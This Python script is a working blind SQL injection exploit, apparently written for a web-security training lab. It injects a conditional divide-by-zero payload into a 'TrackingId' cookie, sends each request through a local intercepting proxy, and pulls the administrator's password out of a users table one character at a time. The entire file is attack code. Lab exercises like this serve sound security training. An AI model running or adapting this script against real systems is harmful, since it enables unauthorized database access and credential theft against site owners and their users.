import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def sqli_password(url): 
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s') || ' " % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies_sqli = {'TrackingId': 'PASTE HERE' + sqli_payload_encoded, 'session': 'PASTE HERE'}
            r = requests.get(url, cookies=cookies_sqli, verify=False, proxies=proxies)
            if r.status_code == 200:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])

    url = sys.argv[1]
    print("(+) Retrieving Password...")
    sqli_password(url)

if __name__ == "__main__":
    main()
